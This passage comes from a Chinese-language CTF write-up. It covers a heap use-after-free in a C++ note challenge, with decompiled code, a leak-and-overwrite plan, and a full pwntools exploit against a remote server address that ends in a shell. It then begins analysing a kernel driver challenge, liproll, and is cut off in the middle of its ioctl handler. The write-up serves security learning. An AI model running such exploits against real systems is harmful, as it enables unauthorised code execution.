class="keyword">bool</span>(<span class="keyword">this</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span>);</span><br><span class="line">    result = NoteImpl::save(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">8</span>);</span><br><span class="line">    result = NoteImpl::save(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You have no house to save!!!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺序判断<code>member_1</code>和<code>member_2</code>是否为空，不为空，则调用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteImpl::save(NoteImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::shrink_to_fit((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对相应<code>member_1</code>（或者<code>member_2</code>）结构体中的<code>buf_1</code>vector进行<code>shrink_to_fit</code>操作，即将vector的大小缩小到满足储存需要并且对齐0x10的最小值；从行为上看，是会将原来所占的buffer给先<code>free</code>掉，然后根据原vector的size重新再<code>malloc</code>空间。</p><p>这是很关键的一个函数，由于vector的所占内存空间的增长方式是倍增，所以如果想要获得某个特定大小的vector，就可通过<code>shrink_to_fit</code>来实现，此时vector的倍增基数就变成了可控的大小。</p></li><li><p>backup：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __fastcall NoteStorageImpl::backup(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span>);</span><br><span class="line">    <span class="built_in">std</span>::make_unique&lt;NoteDBImpl,NoteImpl *&gt;(v3, &amp;v2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span>=((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>, v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::~<span class="built_in">unique_ptr</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断<code>NoteStorageImpl</code>中的<code>house-&gt;status</code>是否为0，若为0则将<code>member_1</code>赋值给<code>house-&gt;member</code>。</p></li><li><p>encourage：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::encourage(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )<span class="comment">// judge if backed up</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    result = NoteDBImpl::getEncourage(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You can not get encourage now!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall NoteDBImpl::getEncourage(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = **((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)<span class="keyword">this</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    result = (***((__int64 (__fastcall ****)(_QWORD))<span class="keyword">this</span> + <span class="number">1</span>))(*((_QWORD *)<span class="keyword">this</span> + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>house</code>存在的情况下，且<code>house-&gt;member</code>以及<code>house-&gt;member-&gt;func_get_encourage</code>不为0，则调用相应的<code>house-&gt;member-&gt;func_get_encourage</code>函数。</p></li><li><p>delHouse：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::delHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )<span class="comment">// judge if backed up</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    NoteDBImpl::setdel(v1);</span><br><span class="line">    result = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::reset((__int64)<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You can not delete now!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NoteDBImpl *__fastcall NoteDBImpl::setdel(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(_BYTE *)<span class="keyword">this</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::reset(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a1;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v2 = <span class="built_in">std</span>::__uniq_ptr_impl&lt;NoteImpl,<span class="built_in">std</span>::default_delete&lt;NoteImpl&gt;&gt;::_M_ptr(a1);</span><br><span class="line">  <span class="built_in">std</span>::swap&lt;NoteImpl *&gt;(v2, &amp;v5);</span><br><span class="line">  result = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get_deleter(v6);</span><br><span class="line">    result = <span class="built_in">std</span>::default_delete&lt;NoteImpl&gt;::<span class="keyword">operator</span>()(v4, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>house</code>存在的情况下，置<code>house-&gt;status</code>为1，并释放<code>house-&gt;member</code>内存空间以及置<code>NoteStorageImpl-&gt;member_1</code>为0。</p><p>显然这里<code>house-&gt;member</code>本身并没有置0，且<code>delHouse</code>和<code>encourage</code>也没有检查就使用了，显然存在uaf。</p></li><li><p>show：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall NoteStorageImpl::show(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    result = NoteDBImpl::gift(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"NO!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __fastcall NoteDBImpl::gift(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">   result = *(<span class="keyword">unsigned</span> __int8 *)<span class="keyword">this</span>;</span><br><span class="line">   <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">     result = <span class="built_in">puts</span>(*((<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="keyword">this</span> + <span class="number">1</span>));</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在<code>backup</code>并且<code>delHouse</code>之后（即<code>house-&gt;status = 1</code>），调用此函数可以打印出<code>house-&gt;member</code> 内容。</p></li></ul></li><li><p>根据以上分析，可以发现，当依次调用了<code>backup</code>和<code>delHouse</code>功能后，虽然<code>NoteStorageImpl-&gt;member_1 = 0</code>且空间被释放，但是<code>NoteStorageImpl-&gt;house-&gt;member</code>却没有清空；于是只要再把这块空间<code>malloc</code>出来，就可以通过<code>show</code>把该块chunk中残留的一些指针leak出来，同时如果把该<code>NoteImpl-&gt;func_get_encourage</code>给劫持成onegadget，再调用就可以getshell了。</p></li><li><p>其实题目也有些小提示，比如特意在<code>NoteImpl</code>结构体中<code>offset = 0x1b8</code>的位置留了一个<code>malloc</code>的地址可以用来leak libc，在<code>offset = 0x1a0</code>的地方留一个vector结构体可以用来leak heap。</p></li><li><p>整个利用思路如下：</p><ul><li>首先依次调用<code>backup</code>和<code>delHouse</code>，将<code>member_1</code>给释放掉；此时tcache中存在一个<code>size = 0x350</code>的chunk，接下来利用就是围绕这个chunk。</li><li>调用<code>editHouse</code>（此时不<code>clear</code>），写入0x1a0字节的数据，由于实际是通过不断地<code>push_back</code>写入的，所以最终会得到一个<code>size = 0x290</code>的chunk。</li><li>调用<code>save</code>，触发对上述提到的chunk进行<code>shrink_to_fit</code>，从而将<code>0x290</code>的chunk释放掉，得到一个<code>size = 0x1b0</code>的chunk。</li><li>继续进行<code>editHouse</code>，继续<code>push_back</code>写入0x10个字节数据，因为<code>push_back</code>的过程中，vector的size会不断增大，从而最终超过该chunk的size，vector就会进行倍增，从而<code>malloc</code>出一个<code>size = 0x350</code>的chunk，也就是拿到了<code>NoteStorageImpl-&gt;member_1</code>（或<code>NoteStorageImpl-&gt;house-&gt;member</code>）所在的chunk；这样再通过<code>show</code>就能leak出紧跟在后面的heap和malloc的地址。</li><li>最后调用<code>editHouse</code>，并<code>clear</code>掉vector，即后续<code>push_back</code>会从chunk头开始，这样就可以覆盖<code>house-&gt;member-&gt;func_get_encourage = onegadget</code>。</li><li>调用<code>encourage</code>功能，触发onegadget。</li></ul></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'106.14.216.214'</span>, <span class="number">27972</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"A"</span> * <span class="number">0x1A0</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"heapaddr"</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x121e5</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"libcaddr"</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"libcaddr"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">'malloc'</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"y"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, p64(heap_base + <span class="number">0x11e98</span>) + p64(libc_base + <span class="number">0x10a41c</span>) + <span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="liproll"><a href="#liproll" class="headerlink" title="liproll"></a>liproll</h1><ol><li><p>首先解包rootfs，查看init：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">chown -R root:root /bin /usr /root</span><br><span class="line"></span><br><span class="line">echo "flag&#123;this_is_a_test_flag&#125;" &gt; /root/flag</span><br><span class="line">chmod -R 400 /root</span><br><span class="line">chmod -R o-r /proc/kallsyms</span><br><span class="line">chmod -R 755 /bin /usr</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">insmod /liproll.ko</span><br><span class="line"></span><br><span class="line">chmod 777 /dev/liproll</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo 'sh end!\n'</span><br><span class="line">poweroff -d 1800000 -f &amp;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>可以看出加载了一个名为liproll的driver，并且dmesg信息和/proc/kallsyms都不可读。</p><p>从run.sh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-nographic \</span><br><span class="line">-m 2G \</span><br><span class="line">-smp cores=2,threads=2,sockets=1 \</span><br><span class="line">-monitor /dev/null \</span><br></pre></td></tr></table></figure><p>可以知道开启了kaslr保护。</p></li><li><p>从rootfs中拿出liproll.ko分析，关键函数有：</p><ul><li><p>liproll_unlocked_ioctl：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    create_a_spell();</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F04</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    choose_a_spell(a3);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F01</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F02</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        global_buffer = <span class="number">0L</span>L;</span><br><span class="line">        *(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    cast_a_spell(a3);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line"> 